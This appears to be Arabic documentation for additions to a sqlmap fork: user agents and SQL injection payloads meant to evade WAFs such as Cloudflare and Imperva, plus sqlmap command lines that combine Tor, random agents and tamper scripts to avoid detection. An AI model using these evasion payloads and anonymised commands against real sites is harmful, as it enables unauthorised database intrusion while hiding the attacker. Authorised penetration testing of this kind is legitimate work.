# توثيق الملفات الجديدة - New Files Documentation
# Copyright (c) 2025 Aya Elbadry (@Aya-Elbadry)

## نظرة عامة
تم إضافة ملفين جديدين لتحسين قدرات sqlmap في تخطي أنظمة الحماية (WAF) وإخفاء الهوية:

1. **new Agents.txt** - User Agents جديدة
2. **new_payloads.xml** - SQL Injection Payloads جديدة لتخطي WAF

---

## 1. ملف new Agents.txt

### الموقع
`data/txt/new Agents.txt`

### المحتوى
يحتوي على **50+ User Agent** جديد مصمم خصيصاً لـ:
- تخطي كشف WAF
- إخفاء الهوية
- محاكاة متصفحات حديثة
- دعم Tor Browser

### الفئات المتضمنة:
- **Modern Chrome** (أحدث الإصدارات)
- **Firefox** (أحدث الإصدارات)
- **Edge**
- **Safari**
- **Opera**
- **Mobile iOS**
- **Mobile Android**
- **Tor Browser** (لإخفاء الهوية)
- **Browsers غير شائعة** (Vivaldi, Brave)
- **Bot-like Agents** (Googlebot, Bingbot)

### كيفية الاستخدام:

#### الطريقة 1: استخدام مع sqlmap
```bash
# استخدام User Agent محدد من الملف
python sqlmap.py -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

# استخدام User Agent عشوائي من الملف
python sqlmap.py -u "http://target.com/page?id=1" --random-agent
```

#### الطريقة 2: استبدال الملف الأصلي
```bash
# نسخ الملف الجديد مكان الملف الأصلي
cp "data/txt/new Agents.txt" "data/txt/user-agents.txt"
```

---

## 2. ملف new_payloads.xml

### الموقع
`data/xml/payloads/new_payloads.xml`

### المحتوى
يحتوي على **25+ SQL Injection Payload** جديد مصمم خصيصاً لتخطي:
- **Akamai WAF**
- **Cloudflare**
- **Imperva**
- **Incapsula**
- **WordFence**
- **ModSecurity**
- **AWS WAF**

### تقنيات التمويه المستخدمة:

#### 1. Comment Obfuscation (/**/)
```sql
AND/**/[RANDNUM]=[RANDNUM]
UNION/**/ALL/**/SELECT/**/[COLUMNS]
```

#### 2. Space Obfuscation (%09, %0A)
```sql
AND%09[RANDNUM]=[RANDNUM]
AND%0A[RANDNUM]=[RANDNUM]
```

#### 3. Inline Comments (/*!50000*/)
```sql
AND/*!50000[RANDNUM]=[RANDNUM]*/
```

#### 4. Case Variation
```sql
aNd [RANDNUM]=[RANDNUM]
```

#### 5. Double Encoding
```sql
%41%4E%44 [RANDNUM]=[RANDNUM]
```

#### 6. Nested Functions
```sql
AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=...
```

### أنواع الـ Payloads:

#### Boolean-based Blind
- مع comment obfuscation
- مع space obfuscation
- مع newline obfuscation
- مع hex encoding
- مع char() function
- مع LIKE operator

#### Error-based
- MySQL: EXTRACTVALUE مع comment obfuscation
- MySQL: EXTRACTVALUE مع space obfuscation

#### Time-based Blind
- MySQL: SLEEP مع comment obfuscation
- MySQL: BENCHMARK
- PostgreSQL: pg_sleep
- MSSQL: WAITFOR DELAY
- Oracle: DBMS_PIPE.RECEIVE_MESSAGE

#### UNION Query
- مع comment obfuscation
- مع space obfuscation

#### Stacked Queries
- مع comment obfuscation

### كيفية الاستخدام:

#### الطريقة 1: إضافة الملف إلى قائمة Payloads
يجب تعديل ملف `lib/core/settings.py` لإضافة الملف الجديد:

```python
PAYLOAD_XML_FILES = (
    "boolean_blind.xml",
    "error_based.xml",
    "inline_query.xml",
    "stacked_queries.xml",
    "time_blind.xml",
    "union_query.xml",
    "new_payloads.xml"  # إضافة هذا السطر
)
```

#### الطريقة 2: استخدام مع Tamper Scripts
يمكن استخدام الـ payloads مع tamper scripts الموجودة:
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tamper=space2comment,charencode
```

---

## 3. استخدام Tor لإخفاء الهوية

### التثبيت:
```bash
# على Linux
sudo apt-get install tor

# على Windows
# تحميل Tor Browser من https://www.torproject.org/
```

### الاستخدام مع sqlmap:

#### الطريقة 1: استخدام --tor
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor
```

#### الطريقة 2: استخدام --tor مع --check-tor
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor --check-tor
```

#### الطريقة 3: تحديد منفذ Tor مخصص
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor --tor-port=9050
```

#### الطريقة 4: استخدام Tor مع User Agent جديد
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor --user-agent="Mozilla/5.0 (Windows NT 10.0; rv:131.0) Gecko/20100101 Firefox/131.0"
```

#### الطريقة 5: استخدام Tor مع Payloads الجديدة
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor --level=3 --risk=2
```

### إعدادات Tor في sqlmap.conf:
```ini
# Use Tor anonymity network.
tor = True

# Set Tor proxy port other than default.
torPort = 9050

# Set Tor proxy type.
torType = SOCKS5

# Check to see if Tor is used properly.
checkTor = True
```

---

## 4. أمثلة استخدام متقدمة

### مثال 1: اختبار كامل مع WAF Bypass
```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --tor \
  --random-agent \
  --level=3 \
  --risk=2 \
  --tamper=space2comment,charencode,randomcase \
  --delay=2 \
  --timeout=30
```

### مثال 2: استخدام مع Proxy Chain
```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --tor \
  --proxy="socks5://127.0.0.1:9050" \
  --random-agent
```

### مثال 3: اختبار مع User Agent محدد من الملف الجديد
```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; rv:131.0) Gecko/20100101 Firefox/131.0" \
  --tor \
  --level=3
```

---

## 5. ملاحظات مهمة

### ⚠️ تحذيرات:
1. **استخدام Tor قد يبطئ الاتصال** - استخدم `--delay` لتقليل الضغط
2. **بعض الـ Payloads قد تفشل** - جرب payloads مختلفة
3. **WAF قد يتكيف** - استخدم tamper scripts مختلفة
4. **الاستخدام الأخلاقي فقط** - استخدم فقط على أنظمة تملكها أو لديك إذن لاختبارها

### ✅ أفضل الممارسات:
1. استخدم `--check-tor` للتأكد من عمل Tor
2. استخدم `--random-agent` لتغيير User Agent عشوائياً
3. استخدم `--delay` لتجنب Rate Limiting
4. استخدم `--timeout` مناسب للاتصالات البطيئة
5. جرب tamper scripts مختلفة مع payloads جديدة

---

## 6. استكشاف الأخطاء

### مشكلة: Tor لا يعمل
```bash
# تحقق من حالة Tor
sudo systemctl status tor

# أو على Windows
# تحقق من Tor Browser يعمل على المنفذ 9150
```

### مشكلة: Payloads لا تعمل
```bash
# جرب مستوى أعلى
python sqlmap.py -u "http://target.com/page?id=1" --level=4

# جرب risk أعلى
python sqlmap.py -u "http://target.com/page?id=1" --risk=3
```

### مشكلة: WAF لا يزال يكتشف
```bash
# استخدم tamper scripts متعددة
python sqlmap.py -u "http://target.com/page?id=1" --tamper=space2comment,charencode,randomcase,base64encode
```

---

## 7. التطوير المستقبلي

### خطط مستقبلية:
- [ ] إضافة المزيد من User Agents
- [ ] إضافة payloads خاصة بـ NoSQL Injection
- [ ] إضافة payloads خاصة بـ XPath Injection
- [ ] تحسين دعم Tor
- [ ] إضافة دعم Proxy Rotation

---

## 8. المساهمة

للمساهمة بتحسينات:
1. أضف User Agents جديدة في `new Agents.txt`
2. أضف payloads جديدة في `new_payloads.xml`
3. اختبر على بيئات مختلفة
4. شارك النتائج

---

## 9. المراجع

- [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [Tor Project](https://www.torproject.org/)
- [WAF Bypass Techniques](https://github.com/0xInfection/Awesome-WAF)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**تم الإنشاء بواسطة:** Aya Elbadry (@Aya-Elbadry)  
**التاريخ:** 2025  
**الترخيص:** GPLv2



